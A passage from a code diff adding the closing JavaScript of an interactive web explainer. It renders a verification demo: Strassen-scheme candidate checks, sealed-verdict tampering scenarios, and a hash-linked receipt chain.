+    var kv = el("dl", { class: "kv" });
+    kv.appendChild(el("dt", null, "reason_code")); kv.appendChild(el("dd", null, c.r));
+    dec.appendChild(kv);
+    dec.appendChild(el("div", { class: "why" }, c.why));
+    Array.prototype.forEach.call(document.querySelectorAll("#cap-walk > *"), function (n, i) { n.style.transitionDelay = (reduce ? 0 : 150 + i * 220) + "ms"; });
+    Array.prototype.forEach.call(dec.children, function (n) { n.style.transitionDelay = (reduce ? 0 : 250 + c.f.length * 220) + "ms"; });
+    requestAnimationFrame(function () { requestAnimationFrame(function () { walk.classList.add("in"); dec.classList.add("in"); }); });
+    Array.prototype.forEach.call(document.querySelectorAll("#cap-pick .btn"), function (b) { b.setAttribute("aria-pressed", b.getAttribute("data-id") === id ? "true" : "false"); });
+  }
+  var pick = document.getElementById("cap-pick");
+  ORDER.forEach(function (id) {
+    var b = el("button", { type: "button", class: "btn", "data-id": id, "aria-pressed": "false" }, CMDS[id].cmd);
+    b.addEventListener("click", function () { showCmd(id, EX.reduced()); });
+    pick.appendChild(b);
+  });
+  EX.scenes.cap = function (state, reduce) { showCmd(state, reduce); };
+
+  /* ---- 3. the gate: candidates, seal, recheck ---- */
+  var STRASSEN = [[[1, 0, 0, 1], [1, 0, 0, 1], [1, 0, 0, 1]], [[0, 0, 1, 1], [1, 0, 0, 0], [0, 0, 1, -1]],
+    [[1, 0, 0, 0], [0, 1, 0, -1], [0, 1, 0, 1]], [[0, 0, 0, 1], [-1, 0, 1, 0], [1, 0, 1, 0]],
+    [[1, 1, 0, 0], [0, 0, 0, 1], [-1, 1, 0, 0]], [[-1, 0, 1, 0], [1, 1, 0, 0], [0, 0, 0, 1]],
+    [[0, 1, 0, -1], [0, 0, 1, 1], [1, 0, 0, 0]]];
+  var tb = document.querySelector("#gate-table tbody");
+  STRASSEN.forEach(function (t, i) {
+    var tr = el("tr");
+    tr.appendChild(el("td", null, "M" + (i + 1)));
+    t.forEach(function (v) { tr.appendChild(el("td", null, "[" + v.join(", ") + "]")); });
+    tb.appendChild(tr);
+  });
+  var CANDS = [["seed 0", "PASS", "Strassen's scheme, unchanged", "exact matmul tensor reproduced with rank 7"],
+    ["seed 1", "FAIL", "M2, w[1]: 0 becomes 1", "tensor mismatch: 0 missing, 2 extra, 0 wrong-valued entries"],
+    ["seed 2", "FAIL", "M3, w[2]: 0 becomes 1", "tensor mismatch: 0 missing, 2 extra, 0 wrong-valued entries"],
+    ["seed 3", "FAIL", "M4, w[3]: 0 becomes 1", "tensor mismatch: 0 missing, 2 extra, 0 wrong-valued entries"]];
+  var cwrap = document.getElementById("gate-cands");
+  var cards = CANDS.map(function (c, i) {
+    var d = el("div", { class: "cand" + (i === 0 ? " win" : "") });
+    var head = el("div");
+    head.appendChild(el("b", null, c[0] + " "));
+    head.appendChild(el("span", { class: "v " + (c[1] === "PASS" ? "v-ok" : "v-drift") }, c[1]));
+    d.appendChild(head);
+    d.appendChild(el("div", null, c[2]));
+    d.appendChild(el("div", { class: "tag" }, c[3]));
+    cwrap.appendChild(d);
+    return d;
+  });
+  EX.scenes.gate = function (state, reduce) {
+    var env = document.getElementById("gate-env"), rw = document.getElementById("gate-rw");
+    var scheme = document.getElementById("gate-scheme"), collect = document.getElementById("gate-collect");
+    env.classList.remove("in"); rw.classList.remove("in");
+    scheme.hidden = state !== "collect";
+    env.hidden = state === "collect";
+    rw.hidden = state !== "rewitness";
+    collect.hidden = state === "rewitness";
+    cards.forEach(function (c, i) {
+      c.classList.remove("dim");
+      if (state !== "collect" && i) c.classList.add("dim");
+      if (state === "collect" && !reduce) {
+        c.classList.add("dim");
+        EX.later(function () { c.classList.remove("dim"); }, 250 + i * 380);
+      }
+    });
+    var go = function () { env.classList.add("in"); rw.classList.add("in"); };
+    if (reduce) go(); else EX.later(go, 120);
+  };
+
+  /* ---- 4. tampering with the envelope ---- */
+  var TAMPER = {
+    coef: { label: "bump one coefficient", stored: ["PASS", "93e4b6c6b7a05c82"], fresh: ["FAIL", "mismatch_634a550..."], v: "DRIFT", cls: "v-drift",
+      note: "re-derived verdict differs from the sealed one" },
+    verdict: { label: "rewrite verdict to FAIL", stored: ["FAIL", "93e4b6c6b7a05c82"], fresh: ["PASS", "93e4b6c6b7a05c82"], v: "DRIFT", cls: "v-drift",
+      note: "the record disagrees with a fresh check" },
+    missing: { label: "delete the envelope", stored: ["(no file)", ""], fresh: ["not run", ""], v: "UNVERIFIABLE", cls: "v-unv",
+      note: "nothing to read, so nothing is asserted" },
+    nocand: { label: "remove the candidate", stored: ["PASS", "93e4b6c6b7a05c82"], fresh: ["not run", "no candidate"], v: "UNVERIFIABLE", cls: "v-unv",
+      note: "the oracle has nothing to re-run" }
+  };
+  function showTamper(id, reduce) {
+    var t = TAMPER[id], cmp = document.getElementById("tamper-cmp"), res = document.getElementById("tamper-res");
+    cmp.classList.remove("in"); res.classList.remove("in");
+    cmp.textContent = ""; res.textContent = "";
+    [["stored in the envelope", t.stored], ["oracle re-run now", t.fresh]].forEach(function (side) {
+      var d = el("div");
+      d.appendChild(el("div", { class: "tag" }, side[0]));
+      var kv = el("dl", { class: "kv" });
+      kv.appendChild(el("dt", null, "verdict")); kv.appendChild(el("dd", null, side[1][0]));
+      kv.appendChild(el("dt", null, "output")); kv.appendChild(el("dd", null, side[1][1] || "none"));
+      d.appendChild(kv);
+      cmp.appendChild(d);
+    });
+    res.appendChild(el("span", { class: "v vbox " + t.cls }, t.v));
+    res.appendChild(el("span", { class: "tag" }, "  " + t.note));
+    Array.prototype.forEach.call(document.querySelectorAll("#tamper-pick .btn"), function (b) { b.setAttribute("aria-pressed", b.getAttribute("data-id") === id ? "true" : "false"); });
+    var go = function () { cmp.classList.add("in"); res.classList.add("in"); };
+    if (reduce) go(); else EX.later(go, 80);
+  }
+  var tp = document.getElementById("tamper-pick");
+  Object.keys(TAMPER).forEach(function (id) {
+    var b = el("button", { type: "button", class: "btn", "data-id": id, "aria-pressed": "false" }, TAMPER[id].label);
+    b.addEventListener("click", function () { showTamper(id, EX.reduced()); });
+    tp.appendChild(b);
+  });
+  EX.scenes.tamper = function (state, reduce) { showTamper(state, reduce); };
+
+  /* ---- 5. the receipt chain ---- */
+  var CHAIN = [["boot", "", "31c834d990a0a8b4"], ["propose", "31c834d990a0a8b4", "51c36fc399305691"],
+    ["policy", "51c36fc399305691", "f2547351f53759ba"], ["verify", "f2547351f53759ba", "eaa37176c79676b3"],
+    ["accept", "eaa37176c79676b3", "a27330f0583d014e"]];
+  EX.scenes.chain = function (state, reduce) {
+    var wrap = document.getElementById("chain"), res = document.getElementById("chain-res");
+    wrap.textContent = ""; res.textContent = ""; res.classList.remove("in");
+    var boxes = CHAIN.map(function (r, i) {
+      var d = el("div", { class: "rcpt" });
+      d.appendChild(el("b", null, i + " " + r[0]));
+      d.appendChild(el("div", { class: "h" }, "prev " + (r[1] ? r[1].slice(0, 8) : "none")));
+      d.appendChild(el("div", { class: "h" }, "hash " + r[2].slice(0, 8)));
+      wrap.appendChild(d);
+      return d;
+    });
+    var v, cls, note;
+    if (state === "broken") {
+      boxes[2].classList.add("edited");
+      boxes[2].children[2].textContent = "hash changed";
+      boxes[3].classList.add("broken");
+      boxes[3].children[1].classList.add("mark");
+      boxes[3].children[1].textContent = "prev f2547351, no longer agrees";
+      v = "UNVERIFIABLE"; cls = "v-unv"; note = "broken link at stage 3 (verify): prev_hash mismatch";
+    } else if (state === "rewit") {
+      boxes[3].classList.add("edited");
+      boxes[3].appendChild(el("div", { class: "h mark" }, "stored PASS, fresh FAIL"));
+      v = "DRIFT"; cls = "v-drift"; note = "stage 3 (verify) verdict drifted; every link intact";
+    } else {
+      v = "MATCH"; cls = "v-ok"; note = "all links verified (structural), head a27330f0";
+    }
+    res.appendChild(el("span", { class: "v vbox " + cls }, v));
+    res.appendChild(el("span", { class: "tag" }, "  " + note));
+    boxes.forEach(function (b, i) {
+      b.style.opacity = reduce ? 1 : 0;
+      if (!reduce) EX.later(function () { b.style.transition = "opacity .35s"; b.style.opacity = 1; }, 100 + i * 160);
+    });
+    if (reduce) res.classList.add("in"); else EX.later(function () { res.classList.add("in"); }, 950);
+  };
+})();
+</script>
+</body>
+</html>
